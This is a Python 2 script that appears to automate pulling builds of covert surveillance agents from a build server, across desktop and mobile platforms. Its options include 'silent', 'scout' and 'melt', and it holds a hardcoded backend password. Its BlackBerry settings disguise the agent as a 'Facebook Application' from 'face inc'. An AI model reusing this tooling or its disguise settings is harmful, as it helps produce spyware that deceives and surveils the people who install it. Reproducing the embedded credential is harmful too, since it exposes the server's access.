__author__ = 'olli'

import sys
import socket

sys.path.append("/Users/olli/Documents/work/AVTest/")

from AVAgent import build

servers = {
    "castore": { "backend": "192.168.100.100",
                 "frontend": "192.168.100.100",
                 "operation": "QA",
                 "target_name": "HardwareFunctional"},
    "polluce": { "backend": "",
                 "frontend": "",
                 "operation": "QA",
                 "target_name": "HardwareFunctional"},
    "zeus": { "backend": "",
              "frontend": "",
              "target_name": "QA",
              "operation": "HardwareFunctional"},
    "minotauro": { "backend": "192.168.100.201",
                   "frontend": "192.168.100.204",
                   "target_name": "QA",
                   "operation": "HardwareFunctional"},
    }

params = {
    "desktop": {
        "windows": {
            'platform_type': 'desktop',
            'binary': {'admin': False, 'demo': False},
            'melt': {'admin': False, 'bit64': True, 'codec': True, 'scout': True},
            'platform': 'windows',
            'meltfile': 'AVAgent/assets/windows/meltapp.exe',
            'sign': {},
            },
        "linux": {
            'platform_type': 'desktop',
            'binary': {'admin': False, 'demo': False},
            'melt': {},
            'platform': 'linux',
            'package': {},
        },
        "osx": {
            'platform_type': 'desktop',
            'binary': {'admin': True, 'demo': False},
            'melt': {},
            'platform': 'osx',
            'package': {},
        },
    },
    "mobile": {
        "android": {
            'platform_type': 'mobile',
            'binary': {'admin': False, 'demo': False},
            'melt': {},
            'platform': 'android',
            'sign': {},
            'package': {},
        },
        "ios": {
            'platform_type': 'mobile',
            'binary': {'demo': False},
            'melt': {},
            'platform': 'ios',
            'package': {'type': 'local'}
        },
        "blackberry": {
            'platform_type': 'mobile',
            'binary': {'demo': False},
            'melt': {'appname': 'facebook', 'desc': 'Applicazione utilissima di social network', 'name': 'Facebook Application', 'vendor': 'face inc', 'version': '1.2.3'},
            'package': {'type': 'local'},
            'platform': 'blackberry',
        },
        "winphone": {
            'platform_type': 'desktop',
            'binary': {'admin': True, 'demo': False},
            'melt': {},
            'platform': 'winphone',
            'package': {}
        }
    }
}


def build_server(kind, platform_type, platform, srv, factory=None):
    global params


    class Args:
        pass

    report = None

    try:
        srv_params = servers[srv]
    except KeyError:
        return False


    args = Args()

    args.action = "pull"
    args.platform = platform
    args.kind = kind
    args.backend = srv_params["backend"]
    args.frontend = srv_params["frontend"]
    args.platform_type = platform_type
    args.operation = srv_params["operation"]
    args.param = params[platform_type][platform]
    args.asset_dir = "assets"

    # servono??
    args.blacklist = ""
    args.soldierlist = ""
    args.nointernetcheck = socket.gethostname()
    args.puppet = "rite"
    args.factory = factory

    build.connection.host = srv_params["backend"]
    #build.connection.user = "avmonitor"
    build.connection.passwd = "testriteP123"

    results, success, errors = build.build(args, report)
    print "after build", results, success, errors
    if success:
        return results
    else:
        return errors
#    return success

def main():
    print "let's build ya"

    p = {
        "desktop": ["windows", "linux", "osx"],
        "mobile": ["android","ios","winphone", "blackberry"],
    }


#    build_server("silent", "desktop", "linux", "castore")
#      print "problem build linux"
#
    for plat in p:
        print "building %s" % plat
        for os in p[plat]:
            print "building os %s" % os
            if build_server("silent", plat, os, "castore") is False:
                print "problem build %s %s" % (plat, os)

    print "all done"

if __name__ == "__main__":
    main()